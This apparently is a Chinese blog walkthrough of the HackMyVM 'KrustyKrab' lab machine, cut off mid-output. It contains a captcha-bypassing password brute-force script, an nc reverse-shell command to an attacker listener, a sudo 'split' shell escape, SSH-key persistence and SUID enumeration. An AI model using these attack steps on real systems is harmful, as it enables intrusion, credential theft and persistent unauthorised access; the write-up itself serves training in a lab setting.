@@ -1,0 +1,255 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackmyvm_KrustyKrab | myift</title><meta name="author" content="dgh"><meta name="copyright" content="dgh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="踩点  80端口访问是一个Apache 默认页 在源码中得到 &#x2F;var&#x2F;www&#x2F;html&#x2F;finexo 访问finexo 有登录功能  第一个用户存在 在登录页面的源码中发现js文件   很明显的jsfuck 解出 function generateCaptcha() &#123;    $characters &#x3D; &quot;ABCDEFGHIJKLMN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackmyvm_KrustyKrab">
+<meta property="og:url" content="http://example.com/2025/05/29/hackmyvm-KrustyKrab/index.html">
+<meta property="og:site_name" content="myift">
+<meta property="og:description" content="踩点  80端口访问是一个Apache 默认页 在源码中得到 &#x2F;var&#x2F;www&#x2F;html&#x2F;finexo 访问finexo 有登录功能  第一个用户存在 在登录页面的源码中发现js文件   很明显的jsfuck 解出 function generateCaptcha() &#123;    $characters &#x3D; &quot;ABCDEFGHIJKLMN">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/png.png">
+<meta property="article:published_time" content="2025-05-29T13:28:02.000Z">
+<meta property="article:modified_time" content="2025-05-29T13:32:03.316Z">
+<meta property="article:author" content="dgh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/png.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "hackmyvm_KrustyKrab",
+  "url": "http://example.com/2025/05/29/hackmyvm-KrustyKrab/",
+  "image": "http://example.com/image/png.png",
+  "datePublished": "2025-05-29T13:28:02.000Z",
+  "dateModified": "2025-05-29T13:32:03.316Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "dgh",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/05/29/hackmyvm-KrustyKrab/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hackmyvm_KrustyKrab',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/png1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">myift</span></a><a class="nav-page-title" href="/"><span class="site-name">hackmyvm_KrustyKrab</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hackmyvm_KrustyKrab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-29T13:28:02.000Z" title="发表于 2025-05-29 21:28:02">2025-05-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-29T13:32:03.316Z" title="更新于 2025-05-29 21:32:03">2025-05-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528202444683.png" alt="image-20250528202444683"></p>
+<p>踩点</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528210323627.png" alt="image-20250528210323627"></p>
+<p>80端口访问是一个Apache 默认页</p>
+<p>在源码中得到</p>
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;finexo</p>
+<p>访问finexo</p>
+<p>有登录功能</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528210635599.png" alt="image-20250528210635599"></p>
+<p>第一个用户存在</p>
+<p>在登录页面的源码中发现js文件</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528210751072.png" alt="image-20250528210751072"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528210800494.png" alt="image-20250528210800494"></p>
+<p>很明显的jsfuck</p>
+<p>解出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function generateCaptcha() &#123;</span><br><span class="line">    $characters = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;</span><br><span class="line">    $code = &quot;&quot;;</span><br><span class="line">    $seed = time();</span><br><span class="line">    mt_srand($seed);</span><br><span class="line">    for ($i = 0; $i &lt; 4; $i++) &#123;</span><br><span class="line">        $code .= $characters[mt_rand(0, strlen($characters) - 1)];</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[&#x27;captcha&#x27;] = strtolower($code);</span><br><span class="line">    return $code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到了验证码的生成逻辑</p>
+<p>依靠<code>Unix</code>时间戳挑选出四个字母组成验证码</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528213457184.png" alt="image-20250528213457184"></p>
+<p>发现访问<a target="_blank" rel="noopener" href="http://ip/finexo/login.php?action=generateCaptcha">http://ip/finexo/login.php?action=generateCaptcha</a></p>
+<p>直接就会给出验证码我们写爆破脚本访问那验证码即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests # 导入 requests 库，用于发送 HTTP 请求</span><br><span class="line"></span><br><span class="line"># 定义目标 URL</span><br><span class="line"># 注意：请确保这里的 IP 地址是你要测试的实际目标 IP！</span><br><span class="line"># 根据之前的讨论，如果是原来的目标，应该是 &#x27;http://192.168.56.132/finexo/login.php&#x27;</span><br><span class="line">captcha_url = &#x27;http://192.168.56.132/finexo/login.php?action=generateCaptcha&#x27; # 验证码生成接口的 URL</span><br><span class="line">login_url = &#x27;http://192.168.56.132/finexo/login.php&#x27; # 登录页面的 URL</span><br><span class="line"></span><br><span class="line"># 创建会话对象</span><br><span class="line"># 使用 requests.Session() 可以保持会话（例如，管理 cookies），这对于登录和验证码机制至关重要。</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">cnt = 0 # 初始化尝试次数计数器</span><br><span class="line"></span><br><span class="line"># 打开 rockyou.txt 字典文件</span><br><span class="line"># &#x27;r&#x27; 表示只读模式，encoding=&quot;utf-8&quot; 指定文件编码，errors=&quot;ignore&quot; 忽略编码错误</span><br><span class="line">with open(&#x27;rockyou.txt&#x27;, &#x27;r&#x27;, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;) as f:</span><br><span class="line">    # 遍历字典文件中的每一行（每个密码）</span><br><span class="line">    for password in f.readlines():</span><br><span class="line"></span><br><span class="line">        # 步骤1: 获取验证码</span><br><span class="line">        # 向验证码生成接口发送 GET 请求，获取响应文本，去除空白字符，并转换为小写。</span><br><span class="line">        # 这是利用了验证码文本直接返回给前端的漏洞点。</span><br><span class="line">        try:</span><br><span class="line">            captcha_response = session.get(captcha_url)</span><br><span class="line">            captcha = captcha_response.text.strip().lower()</span><br><span class="line">            if not captcha: # 如果获取到的验证码为空，则跳过此次尝试</span><br><span class="line">                print(f&quot;  [警告] 无法获取验证码，跳过密码: &#123;password.strip()&#125;&quot;)</span><br><span class="line">                continue</span><br><span class="line">        except requests.exceptions.RequestException as e:</span><br><span class="line">            print(f&quot;  [错误] 获取验证码失败: &#123;e&#125;，跳过密码: &#123;password.strip()&#125;&quot;)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        # 去除从字典文件中读取的密码两端的空白字符（如换行符）</span><br><span class="line">        password = password.strip()</span><br><span class="line"></span><br><span class="line">        # 构造登录请求的 POST 数据</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: &#x27;spongebob&#x27;, # 确定用户名为 &#x27;spongebob&#x27;</span><br><span class="line">            &#x27;password&#x27;: f&#x27;&#123;password&#125;&#x27;, # 使用当前字典中的密码</span><br><span class="line">            &#x27;captcha&#x27;: captcha # 使用实时获取到的验证码</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 步骤2: 发送 POST 请求进行登录</span><br><span class="line">        # 使用会话对象发送数据到登录 URL</span><br><span class="line">        try_login = session.post(login_url, data=data)</span><br><span class="line">        cnt += 1 # 每次尝试后增加计数</span><br><span class="line"></span><br><span class="line">        # 输出当前尝试的密码和总尝试次数，便于跟踪进度</span><br><span class="line">        print(f&quot;正在尝试密码: &#123;password&#125; (第 &#123;cnt&#125; 次尝试)&quot;)</span><br><span class="line"></span><br><span class="line">        # 步骤3: 检查登录结果</span><br><span class="line">        # 判断响应文本中是否包含表示登录成功的关键词 &quot;successful&quot;</span><br><span class="line">        if &quot;successful&quot; in try_login.text:</span><br><span class="line">            print(f&quot;\n--- 成功！---&quot;)</span><br><span class="line">            print(f&quot;登录成功，找到密码: &#123;password&#125;&quot;)</span><br><span class="line">            # 找到密码后，立即停止循环</span><br><span class="line">            break</span><br><span class="line">        # 如果你还想查看其他非成功非明确错误的响应，可以在这里添加更详细的条件和打印。</span><br><span class="line">        # 目前脚本只打印成功信息。</span><br></pre></td></tr></table></figure>
+
+<p>根据靶机无处不在的海绵宝宝元素生成密码本进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spongebob</span><br><span class="line">Spongebob</span><br><span class="line">SPONGEBOB</span><br><span class="line">spongebob1</span><br><span class="line">spongebob123</span><br><span class="line">spongebob@</span><br><span class="line">spongebob!</span><br><span class="line">spongebob_squarepants</span><br><span class="line">SpongeBobSquarePants</span><br><span class="line">squarepants</span><br><span class="line">Squarepants</span><br><span class="line">patrick</span><br><span class="line">Patrick</span><br><span class="line">PATRICK</span><br><span class="line">patrick123</span><br><span class="line">star</span><br><span class="line">Star</span><br><span class="line">squidward</span><br><span class="line">Squidward</span><br><span class="line">SQUIDWARD</span><br><span class="line">tentacles</span><br><span class="line">mrkrabs</span><br><span class="line">Mrkrabs</span><br><span class="line">MrKrabs</span><br><span class="line">krabs</span><br><span class="line">Krabs</span><br><span class="line">pearl</span><br><span class="line">Pearl</span><br><span class="line">sandy</span><br><span class="line">Sandy</span><br><span class="line">chipmunk</span><br><span class="line">plankton</span><br><span class="line">Plankton</span><br><span class="line">chum</span><br><span class="line">bucket</span><br><span class="line">ChumBucket</span><br><span class="line">gary</span><br><span class="line">Gary</span><br><span class="line">meow</span><br><span class="line">pineapple</span><br><span class="line">Pineapple</span><br><span class="line">bikini</span><br><span class="line">bottom</span><br><span class="line">BikiniBottom</span><br><span class="line">krabbypatty</span><br><span class="line">KrabbyPatty</span><br><span class="line">formula</span><br><span class="line">secretformula</span><br><span class="line">jellyfish</span><br><span class="line">Jellyfish</span><br><span class="line">net</span><br><span class="line">bubble</span><br><span class="line">Bubble</span><br><span class="line">blower</span><br><span class="line">clarinet</span><br><span class="line">Clarinet</span><br><span class="line">gloveworld</span><br><span class="line">GloveWorld</span><br><span class="line">rockbottom</span><br><span class="line">RockBottom</span><br><span class="line">goofygoober</span><br><span class="line">GoofyGoober</span><br><span class="line">jellyfishing</span><br><span class="line">Jellyfishing</span><br><span class="line">chumbucket</span><br><span class="line">kelprea</span><br><span class="line">thekrustykrab</span><br><span class="line">KrustyKrab</span><br><span class="line">finexo</span><br><span class="line">Finexo</span><br><span class="line">finexo123</span><br><span class="line">finexo@</span><br><span class="line">finexo!</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528214610227.png" alt="image-20250528214610227"></p>
+<p>成功得到密码SpongeBob&#x2F;squarepants</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528221624985.png" alt="image-20250528221624985"></p>
+<p>可以上传图片🐎</p>
+<p>但是抓住这个包可以改身份</p>
+<p>但是不能利用</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250529134904893.png" alt="image-20250529134904893"></p>
+<p>可以直接更改身份为Administratro但是失败了不能直接变为Administratro但是我们仍然成功为Administratro更改了密码</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250529135541104.png" alt="image-20250529135541104"></p>
+<p>成功登录</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250529135654682.png" alt="image-20250529135654682"></p>
+<p>管理员就是好可以直接执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.56.103 8888 -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>监听得到shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@KrustyKrab:/home$ sudo -l</span><br><span class="line">Matching Defaults entries for www-data on KrustyKrab:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on KrustyKrab:</span><br><span class="line">    (KrustyKrab) NOPASSWD: /usr/bin/split</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@KrustyKrab:/home$ sudo -u KrustyKrab split --filter=/bin/sh /dev/stdin</span><br><span class="line">whoami</span><br><span class="line">KrustyKrab</span><br></pre></td></tr></table></figure>
+
+<p>在KrustyKrab目录下得到userflag</p>
+<p>权限维持可以搞个ssh密钥登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/.ssh</span><br><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0lTDrkYOmPAyKqDSdWVZuDsOnMhScsUK765Po98D9HXbhTKDUbBQ6QhcfTOfiKI/rTK8sgKyulNd6Uyf/MBV7YT6qOtzP7fQ054PFZQViXQNwtcsFmyFLHlnpZzsfoC1eW3EX1/6pyNWfNr+SZrbWJOnaqTzq5ajT9Yob/BSMjrFFnckfqlfFSryTVTFtT64wlyo2x7o6aE9Fvc7b/tWqBZT/H2EqRFZ/4mwz69jrXO6xwhxbNDpPclwhSCR1POMy5HYMPB1cV2vCG+ecwqYR1tbpb5FsksJlKKZe4PPueYBTR1LkIrm12kLLiTzcdcXnVsBtiTrtv/NEi0VwMeD9UWwaUW2k31sE2cehVHeVlas1vQg/t51/kVfTptlrvPWxjSClzxh+Nxtb9AlE87f+9Km2CgwdG9q4UZ4T6sc0xTbtva/N+FEPKuq9kV9Hn7LrLFG9XlkttLh4NggFRW0ddRT3HlJkpJ52LkxaB4+OjoomPp4/LcS7RUkKnn1gEns= root@kali&quot;&gt;~/.ssh/authorized_keys</span><br><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/krus]</span><br><span class="line">└─# ssh KrustyKrab@192.168.56.132 -i id_rsa </span><br><span class="line">The authenticity of host &#x27;192.168.56.132 (192.168.56.132)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:0d4MWSfQ+tUZ0f4j8Wea2uYelBzzcaj0CI4NtYQIx0E.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.56.132&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">Linux KrustyKrab 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Mar 30 00:15:24 2025 from 192.168.56.118</span><br><span class="line">KrustyKrab@KrustyKrab:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>KrustyKrab目录下还有个help图片</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/krus]</span><br><span class="line">└─# file help                           </span><br><span class="line">help: GIF image data, version 89a, 480 x 270</span><br><span class="line"></span><br><span class="line">KrustyKrab@KrustyKrab:~$ sudo -l</span><br><span class="line">Matching Defaults entries for KrustyKrab on KrustyKrab:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span><br><span class="line"></span><br><span class="line">User KrustyKrab may run the following commands on KrustyKrab:</span><br><span class="line">    (spongebob) NOPASSWD: /usr/bin/ttteeesssttt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250529153951742.png" alt="image-20250529153951742"></p>
+<p>使用&#x2F;usr&#x2F;bin&#x2F;ttteeesssttt操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KrustyKrab@KrustyKrab:~$ sudo -u spongebob /usr/bin/ttteeesssttt</span><br><span class="line"></span><br><span class="line">Spongebob forgot how to make Krabby Patty, You need to help him!</span><br><span class="line"></span><br><span class="line">Current shuffled recipe order:</span><br><span class="line">A: Pickles</span><br><span class="line">B: Ketchup</span><br><span class="line">C: Lettuce</span><br><span class="line">D: Patty</span><br><span class="line">E: Onion</span><br><span class="line">F: Top bun</span><br><span class="line">G: Mustard</span><br><span class="line">H: Cheese</span><br><span class="line">I: Tomato</span><br><span class="line">J: Bottom bun</span><br><span class="line"></span><br><span class="line">Please enter the correct order using letters (e.g., ABCDEFGHIJ):</span><br><span class="line">Enter 10 letters (A-J): </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>答案就在动图中</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250529154515733.png" alt="image-20250529154515733"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250529154523604.png" alt="image-20250529154523604"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250529154534468.png" alt="image-20250529154534468"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KrustyKrab@KrustyKrab:~$ sudo -u spongebob /usr/bin/ttteeesssttt</span><br><span class="line"></span><br><span class="line">Spongebob forgot how to make Krabby Patty, You need to help him!</span><br><span class="line"></span><br><span class="line">Current shuffled recipe order:</span><br><span class="line">A: Tomato</span><br><span class="line">B: Onion</span><br><span class="line">C: Lettuce</span><br><span class="line">D: Ketchup</span><br><span class="line">E: Pickles</span><br><span class="line">F: Top bun</span><br><span class="line">G: Patty</span><br><span class="line">H: Cheese</span><br><span class="line">I: Bottom bun</span><br><span class="line">J: Mustard</span><br><span class="line"></span><br><span class="line">Please enter the correct order using letters (e.g., ABCDEFGHIJ):</span><br><span class="line">Enter 10 letters (A-J): IGCHBADJEF</span><br><span class="line"></span><br><span class="line">Validation successful! Perfect Krabby Patty!</span><br><span class="line">spongebob@KrustyKrab:/home/KrustyKrab$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>直接就来到了spongebob用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spongebob@KrustyKrab:/home/KrustyKrab$ cd</span><br><span class="line">spongebob@KrustyKrab:~$ ls</span><br><span class="line">key1  key2.jpeg  note.txt</span><br><span class="line">spongebob@KrustyKrab:~$ file key1</span><br><span class="line">key1: ASCII text</span><br><span class="line">spongebob@KrustyKrab:~$ cat key1</span><br><span class="line">e1964798cfe86e914af895f8d0291812</span><br><span class="line">spongebob@KrustyKrab:~$ cat note.txt</span><br><span class="line"></span><br><span class="line">Squidward is waiting for you!!!!</span><br><span class="line"></span><br><span class="line">password is md5($key1$key2).</span><br><span class="line"></span><br><span class="line">It&#x27;s not so hard as you think.</span><br><span class="line"></span><br><span class="line">You have new mail in /var/mail/spongebob</span><br><span class="line">章鱼哥在等你！！！！</span><br><span class="line"></span><br><span class="line">密码为md5（$key1$key2）。</span><br><span class="line"></span><br><span class="line">没有你想的那么难。</span><br><span class="line"></span><br><span class="line">在/var/mail/spongebob中有新邮件</span><br><span class="line">spongebob@KrustyKrab:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250529155642899.png" alt="image-20250529155642899"></p>
+<p>(好帅的章鱼哥)</p>
+<p>本来以为key2藏在里面结果是我想多了</p>
+<p>直接拿图片的md5值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/krus]</span><br><span class="line">└─# md5sum key2.jpeg              </span><br><span class="line">5e1d0c1a168dc2d70004c2b00ba314ae  key2.jpeg</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>直接计算</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/krus]</span><br><span class="line">└─# echo -n &quot;e1964798cfe86e914af895f8d02918125e1d0c1a168dc2d70004c2b00ba314ae&quot; | md5sum</span><br><span class="line">7ac254848d6e4556b73398dde2e4ef82  -                                     </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spongebob@KrustyKrab:/home$ su Squidward</span><br><span class="line">Password: </span><br><span class="line">$ whoami </span><br><span class="line">Squidward</span><br></pre></td></tr></table></figure>
+
+<p>登录成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/home/Squidward/laststep</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现可利用文件laststep</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file laststep</span><br><span class="line">laststep: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b84dc5079c77a9f2f2d82492f95a9c110ec51c87, for GNU/Linux 3.2.0, not stripped</span><br><span class="line">$ strings laststep</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">setgid</span><br><span class="line">setuid</span><br><span class="line">system</span><br><span class="line">__libc_start_main</span><br><span class="line">__cxa_finalize</span><br><span class="line">libc.so.6</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">GLIBC_2.34</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">PTE1</span><br><span class="line">u+UH</span><br><span class="line">cat /etc/shadow</span><br><span class="line">;*3$&quot;</span><br><span class="line">GCC: (Debian 12.2.0-14) 12.2.0</span><br><span class="line">Scrt1.o</span><br><span class="line">__abi_tag</span><br><span class="line">crtstuff.c</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.0</span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">test.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">_DYNAMIC</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_start_main@GLIBC_2.34</span><br><span 